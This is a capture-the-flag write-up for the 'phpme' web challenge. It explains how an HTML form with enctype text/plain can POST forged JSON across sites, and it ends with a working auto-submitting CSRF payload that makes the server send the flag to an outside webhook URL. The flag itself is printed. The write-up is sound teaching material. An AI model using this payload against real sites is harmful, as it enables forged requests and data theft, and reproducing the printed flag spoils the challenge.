# phpme

Web, 469 points (nice), 64 solves

We're given the following code (with some less relevant parts removed):

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if(isset($_COOKIE['secret']) && $_COOKIE['secret'] === $secret) {
        // https://stackoverflow.com/a/7084677
        $body = file_get_contents('php://input');
        if(isJSON($body) && is_object(json_decode($body))) {
            $json = json_decode($body, true);
            if(isset($json["yep"]) && $json["yep"] === "yep yep yep" && isset($json["url"])) {
                echo "<script>\n";
                echo "    let url = '" . htmlspecialchars($json["url"]) . "';\n";
                echo "    navigator.sendBeacon(url, '" . htmlspecialchars($flag) . "');\n";
                echo "</script>\n";
            } else {
                echo "nope :)";
            }
        } else {
            echo "not json bro";
        }
    } else {
        echo "ur not admin!!!";
    }
} else {
    show_source(__FILE__);
}
?>
```

We're also given an admin bot which presumably visits any URL we give it.



One of the major challenges is the server requires a POST request, while the admin bot sends a GET request to the URL we give it (you can verify this using a webhook). It's clear we will need to submit a link to a website we control. How can we send POST requests?

Well, we can use the JavaScript `fetch` method. However, this fails because of browser restrictions called [Same origin policy (SOP)](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy). This means that when we use `fetch` (or any other JavaScript method) to send HTTP requests, we cannot access the response body (which contains the flag).

Alternatively, we can use forms, which are exempt from the SOP, since forms are not JavaScript. However, we come up against the requirement that we send a JSON body in our POST request. HTML forms usually send URL-encoded form data, not JSON. For example, for a form like

```html
<form action="https://example.com" method="POST">
    <input name="hello" value="world">
    <input type="submit">
</form>
```

would send a POST request when submitted, with body

```
hello=world
```

which is clearly not JSON. However, we can manipulate the name and value of the form inputs to make something that looks like JSON.

```html
<form action="https://example.com" method="POST">
<input
    name='{"hello":"'
    value='world"}'>
<input type='submit'>
</form>
```

We would expect this to produce

```:"
{"hello":"=world"}
```

which is valid JSON, but it actually produces

```
%7B%22hello%22%3A%22=world%22%7D
```

because form data is URL encoded by default.

We can instruct browsers to disable URL encoding by adding the `enctype='text/plain'` attribute in the form.

Ok, so we've found out how to POST JSON using a HTML form. How do we get the flag? We're in luck here, because the server sends a response that contains code to send the flag to any URL we want. When the form is submitted, the browser renders the response body and executes any JavaScript code in the response body. Thus, it sends the flag to a webhook, where we are listening.

The final payload is

```html
<body>
 
<form id="f" enctype='text/plain' action="https://phpme.be.ax/" method="POST">
<input
    name='{"yesp":"'
    value='a","yep":"yep yep yep","url":"https://webhook.site/31d1e4a0-1abe-4fe8-8dd9-b7fedf6387db/"}'>
<input type="submit">
</form>
<script>f.submit()</script>
</body>
```

And the flag is 

`corctf{ok_h0pe_y0u_enj0yed_the_1_php_ch4ll_1n_th1s_CTF!!!}`



Notes: This wouldn't usually work unless the cookie was set with `SameSite=None; Secure` which is why the site must be hosted on HTTPS. Read more about SameSite cookies and how they prevent CSRF attacks [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite).

